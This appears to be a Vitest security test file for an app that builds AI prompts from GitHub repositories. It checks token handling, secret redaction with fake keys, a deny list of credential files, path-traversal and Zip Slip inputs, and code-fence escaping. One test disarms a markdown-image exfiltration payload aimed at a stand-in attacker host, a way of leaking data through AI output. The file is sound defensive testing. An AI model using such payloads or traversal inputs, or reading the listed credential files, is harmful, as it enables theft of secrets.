import { describe, it, expect, beforeEach } from 'vitest';
import JSZip from 'jszip';
import {
  parseGitHubUrl,
  getGitHubToken,
  setGitHubToken,
  clearGitHubToken,
  hasStoredToken,
  isFineGrainedToken,
  sanitizeErrorMessage,
} from '@/services/github';
import {
  isSensitivePath,
  shouldIgnorePath,
  sanitizeFilePath,
  extractZipArchive,
} from '@/services/fileSystem';
import {
  redactSecrets,
  createSafeMarkdownFence,
  sanitizeUserGoal,
  generatePromptText,
} from '@/features/prompt/usePromptGenerator';
import { PROMPT_TEMPLATES } from '@/features/prompt/PromptTemplates';

describe('GitHub URL Parser & Options', () => {
  it('parses standard owner/repo', () => {
    expect(parseGitHubUrl('facebook/react')).toEqual({ owner: 'facebook', repo: 'react' });
    expect(parseGitHubUrl('pmndrs/zustand')).toEqual({ owner: 'pmndrs', repo: 'zustand' });
  });

  it('parses full https URLs with and without .git', () => {
    expect(parseGitHubUrl('https://github.com/facebook/react')).toEqual({ owner: 'facebook', repo: 'react' });
    expect(parseGitHubUrl('https://github.com/facebook/react.git')).toEqual({ owner: 'facebook', repo: 'react' });
    expect(parseGitHubUrl('https://github.com/facebook/react/')).toEqual({ owner: 'facebook', repo: 'react' });
  });

  it('parses SSH and git+https URLs', () => {
    expect(parseGitHubUrl('git@github.com:facebook/react.git')).toEqual({ owner: 'facebook', repo: 'react' });
    expect(parseGitHubUrl('git+https://github.com/facebook/react')).toEqual({ owner: 'facebook', repo: 'react' });
  });

  it('parses branches and monorepo subpaths cleanly', () => {
    const withBranch = parseGitHubUrl('https://github.com/remix-run/react-router/tree/main');
    expect(withBranch).toEqual({
      owner: 'remix-run',
      repo: 'react-router',
      branch: 'main',
    });

    const withSubpath = parseGitHubUrl(
      'https://github.com/remix-run/react-router/tree/main/packages/react-router'
    );
    expect(withSubpath).toEqual({
      owner: 'remix-run',
      repo: 'react-router',
      branch: 'main',
      subpath: 'packages/react-router',
    });

    const withBlob = parseGitHubUrl(
      'https://github.com/facebook/react/blob/main/packages/react/index.js'
    );
    expect(withBlob).toEqual({
      owner: 'facebook',
      repo: 'react',
      branch: 'main',
      subpath: 'packages/react/index.js',
    });
  });

  it('parses protocol-less URLs, query parameters, and hash fragments', () => {
    // Protocol-less URL with subpath
    const noProtocol = parseGitHubUrl(
      'github.com/remix-run/react-router/tree/main/packages/react-router'
    );
    expect(noProtocol).toEqual({
      owner: 'remix-run',
      repo: 'react-router',
      branch: 'main',
      subpath: 'packages/react-router',
    });

    // URL with query parameter (e.g. ?tab=readme-ov-file)
    const withQuery = parseGitHubUrl('https://github.com/pmndrs/zustand?tab=readme-ov-file');
    expect(withQuery).toEqual({ owner: 'pmndrs', repo: 'zustand' });

    // URL with hash fragment
    const withHash = parseGitHubUrl('https://github.com/pmndrs/zustand#readme');
    expect(withHash).toEqual({ owner: 'pmndrs', repo: 'zustand' });

    // Branch URL with query and hash
    const branchWithQuery = parseGitHubUrl(
      'https://github.com/remix-run/react-router/tree/main/packages/react-router?tab=readme#files'
    );
    expect(branchWithQuery).toEqual({
      owner: 'remix-run',
      repo: 'react-router',
      branch: 'main',
      subpath: 'packages/react-router',
    });
  });

  it('rejects invalid inputs gracefully', () => {
    expect(parseGitHubUrl('')).toBeNull();
    expect(parseGitHubUrl('random string without slash')).toBeNull();
    expect(parseGitHubUrl('https://gitlab.com/owner/repo')).toBeNull();
  });
});

describe('GitHub Token Management & Sanitization', () => {
  beforeEach(() => {
    clearGitHubToken();
  });

  it('stores and retrieves token in memory', () => {
    expect(hasStoredToken()).toBe(false);
    setGitHubToken('github_pat_test123');
    expect(hasStoredToken()).toBe(true);
    expect(getGitHubToken()).toBe('github_pat_test123');

    clearGitHubToken();
    expect(hasStoredToken()).toBe(false);
    expect(getGitHubToken()).toBeNull();
  });

  it('identifies fine-grained tokens correctly', () => {
    expect(isFineGrainedToken('github_pat_11AAAAAA_xxxxxx')).toBe(true);
    expect(isFineGrainedToken('ghp_123456789012345678901234567890123456')).toBe(false);
  });

  it('sanitizes error messages to prevent token leakage in UI/logs', () => {
    const rawError = 'Failed to fetch https://api.github.com with token ghp_123456789012345678901234567890123456: 401';
    const sanitized = sanitizeErrorMessage(rawError);
    expect(sanitized).not.toContain('ghp_123456789012345678901234567890123456');
    expect(sanitized).toContain('ghp_REDACTED');

    const fineGrainedError = 'Unauthorized Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.tokenValue';
    const sanitizedBearer = sanitizeErrorMessage(fineGrainedError);
    expect(sanitizedBearer).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.tokenValue');
  });
});

describe('Sensitive File Exclusion & Zip Slip Protection', () => {
  it('identifies sensitive credential and key files', () => {
    expect(isSensitivePath('.env')).toBe(true);
    expect(isSensitivePath('.env.local')).toBe(true);
    expect(isSensitivePath('.env.production')).toBe(true);
    expect(isSensitivePath('id_rsa')).toBe(true);
    expect(isSensitivePath('id_ed25519.pub')).toBe(true);
    expect(isSensitivePath('server.key')).toBe(true);
    expect(isSensitivePath('cert.pem')).toBe(true);
    expect(isSensitivePath('service-account.json')).toBe(true);
    expect(isSensitivePath('firebase-adminsdk-abcdef.json')).toBe(true);
    expect(isSensitivePath('.npmrc')).toBe(true);
    expect(isSensitivePath('.netrc')).toBe(true);
    expect(isSensitivePath('.git-credentials')).toBe(true);
    expect(isSensitivePath('aws/credentials')).toBe(true);

    // Normal files should not be flagged
    expect(isSensitivePath('src/App.tsx')).toBe(false);
    expect(isSensitivePath('package.json')).toBe(false);
    expect(isSensitivePath('src/components/Keypad.tsx')).toBe(false);
  });

  it('shouldIgnorePath excludes sensitive files and traversal attempts', () => {
    expect(shouldIgnorePath('.env')).toBe(true);
    expect(shouldIgnorePath('config/.env.local')).toBe(true);
    expect(shouldIgnorePath('.git-credentials')).toBe(true);
    expect(shouldIgnorePath('.netrc')).toBe(true);
    expect(shouldIgnorePath('../../../etc/passwd')).toBe(true);
    expect(shouldIgnorePath('node_modules/react/index.js')).toBe(true);
    expect(shouldIgnorePath('dist/bundle.js')).toBe(true);

    // Normal source file allowed
    expect(shouldIgnorePath('src/components/Header.tsx')).toBe(false);
  });

  it('sanitizeFilePath prevents directory traversal and Zip Slip attacks', () => {
    expect(sanitizeFilePath('../../etc/passwd')).toBe('etc/passwd');
    expect(sanitizeFilePath('/absolute/path/file.tsx')).toBe('absolute/path/file.tsx');
    expect(sanitizeFilePath('folder/../sub/file.ts')).toBe('folder/sub/file.ts');
    expect(sanitizeFilePath('')).toBe('');
  });

  it('extractZipArchive excludes sensitive files and handles common root prefix safely', async () => {
    const zip = new JSZip();
    zip.file('project/src/App.tsx', 'export function App() { return <div>Safe</div>; }');
    zip.file('project/.env', 'SECRET_API_KEY=123456');
    zip.file('project/.env.local', 'LOCAL_SECRET=abc');
    zip.file('project/.netrc', 'machine github.com login foo password bar');
    zip.file('project/service-account.json', '{"private_key": "secret"}');
    zip.file('project/credentials.json', '{"token": "xyz"}');

    const buffer = await zip.generateAsync({ type: 'arraybuffer' });
    const extracted = await extractZipArchive(buffer);

    const paths = extracted.map((f) => f.path);
    expect(paths).toContain('src/App.tsx');
    // Sensitive files must be completely ignored
    expect(paths).not.toContain('.env');
    expect(paths).not.toContain('.env.local');
    expect(paths).not.toContain('.netrc');
    expect(paths).not.toContain('service-account.json');
    expect(paths).not.toContain('credentials.json');
    expect(paths.some((p) => p.includes('..'))).toBe(false);
  });
});

describe('Prompt Security, Secret Redaction & Fencing', () => {
  it('redacts tokens and keys across GitHub, OpenAI, Gemini, and AWS from snippets', () => {
    const rawCode = `
      const ghToken = "ghp_123456789012345678901234567890123456";
      const pat = "github_pat_11ABCD0123456789_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      const shortPat = "github_pat_11ABCD_1234567890";
      const auth = "Bearer abcdef1234567890abcdef123456";
      const gemini = "AIzaSyD9876543210abcdefghijklmnopqrs";
      const openai = "sk-proj-abc1234567890abcdefghijklmnopqrstuvwxyz";
      const aws = "AKIAIOSFODNN7EXAMPLE";
      const config = { apiKey: "customSecretKey123456" };
    `;

    const redacted = redactSecrets(rawCode);
    expect(redacted).not.toContain('ghp_123456789012345678901234567890123456');
    expect(redacted).not.toContain('github_pat_11ABCD0123456789');
    expect(redacted).not.toContain('github_pat_11ABCD_1234567890');
    expect(redacted).not.toContain('abcdef1234567890abcdef123456');
    expect(redacted).not.toContain('AIzaSyD9876543210abcdefghijklmnopqrs');
    expect(redacted).not.toContain('sk-proj-abc1234567890abcdefghijklmnopqrstuvwxyz');
    expect(redacted).not.toContain('AKIAIOSFODNN7EXAMPLE');
    expect(redacted).not.toContain('customSecretKey123456');

    expect(redacted).toContain('ghp_REDACTED_PAT');
    expect(redacted).toContain('github_pat_REDACTED_TOKEN');
    expect(redacted).toContain('AIzaSy_REDACTED_KEY');
    expect(redacted).toContain('sk_REDACTED_KEY');
    expect(redacted).toContain('AKIA_REDACTED_AWS');
  });

  it('dynamically scales markdown code fences to prevent code fence injection breakout', () => {
    // Snippet with no backticks -> uses standard ```
    expect(createSafeMarkdownFence('console.log("hello");')).toBe('```');

    // Snippet containing ``` -> uses ````
    const withTriple = 'const md = "```typescript\\ncode\\n```";';
    expect(createSafeMarkdownFence(withTriple)).toBe('````');

    // Snippet containing ```` -> uses `````
    const withQuad = 'const md = "````\\ninner\\n````";';
    expect(createSafeMarkdownFence(withQuad)).toBe('`````');
  });

  it('disarms markdown image exfiltration attacks in user goals', () => {
    const maliciousGoal = 'Adicionar login ![exfil](https://attacker.com/leak?data=secret) no sistema';
    const disarmed = sanitizeUserGoal(maliciousGoal);
    expect(disarmed).not.toContain('https://attacker.com/leak');
    expect(disarmed).toContain('Imagem externa desarmada');
  });

  it('generates secure prompt with safety directives and sanitized snippets', () => {
    const template = PROMPT_TEMPLATES[0];
    const selected = [
      {
        id: '1',
        label: 'AuthService',
        nodeType: 'component' as const,
        filePath: 'src/services/auth.ts',
        codeSnippet: 'const token = "ghp_123456789012345678901234567890123456";\n```inner```',
      },
    ];

    const prompt = generatePromptText(template, 'Implementar Auth', selected, 'react');

    expect(prompt).toContain('Diretrizes de Segurança');
    expect(prompt).not.toContain('ghp_123456789012345678901234567890123456');
    expect(prompt).toContain('ghp_REDACTED_PAT');
    // Fencing escalated to 4 backticks because snippet contains 3 backticks
    expect(prompt).toContain('````ts');
  });
});

describe('Content Security Policy & Strict Compliance', () => {
  it('ensures index.html contains no inline scripts that violate strict script-src', async () => {
    const fs = await import('fs');
    const path = await import('path');
    const indexPath = path.resolve(__dirname, '../../index.html');
    const html = fs.readFileSync(indexPath, 'utf-8');

    // Regex checking for inline <script> tags with content (not <script src="...">)
    const inlineScriptMatch = html.match(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi);
    expect(inlineScriptMatch).toBeNull();
  });
});
